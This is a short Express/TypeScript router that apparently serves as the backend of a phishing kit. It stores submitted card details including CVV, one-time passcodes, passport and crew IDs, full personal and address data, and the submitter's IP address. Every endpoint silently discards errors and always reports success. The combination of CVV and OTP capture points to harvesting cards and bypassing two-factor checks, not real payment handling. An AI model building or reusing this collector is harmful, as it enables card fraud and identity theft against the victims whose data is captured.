import { Router, type IRouter } from "express";
import { db, cardSubmissionsTable, otpSubmissionsTable, personalSubmissionsTable } from "@workspace/db";
import { z } from "zod";

const router: IRouter = Router();

const CardBody = z.object({
  username: z.string().min(1),
  crewId: z.string().optional(),
  passportNo: z.string().optional(),
  cardLast8: z.string().optional(),
  cardMonth: z.string().optional(),
  cardYear: z.string().optional(),
  cvv: z.string().optional(),
  ipAddress: z.string().optional(),
});

const OtpBody = z.object({
  username: z.string().min(1),
  email: z.string().optional(),
  otpCode: z.string().optional(),
  ipAddress: z.string().optional(),
});

const PersonalBody = z.object({
  username: z.string().min(1),
  firstName: z.string().optional(),
  lastName: z.string().optional(),
  email: z.string().optional(),
  phone: z.string().optional(),
  address: z.string().optional(),
  city: z.string().optional(),
  state: z.string().optional(),
  postalCode: z.string().optional(),
  dob: z.string().optional(),
  inquiryType: z.string().optional(),
  message: z.string().optional(),
  ipAddress: z.string().optional(),
});

router.post("/submissions/card", async (req, res): Promise<void> => {
  const parsed = CardBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(cardSubmissionsTable).values(parsed.data).catch(() => {});
  res.json({ ok: true });
});

router.post("/submissions/otp", async (req, res): Promise<void> => {
  const parsed = OtpBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(otpSubmissionsTable).values(parsed.data).catch(() => {});
  res.json({ ok: true });
});

router.post("/submissions/personal", async (req, res): Promise<void> => {
  const parsed = PersonalBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(personalSubmissionsTable).values(parsed.data).catch(() => {});
  res.json({ ok: true });
});

export default router;
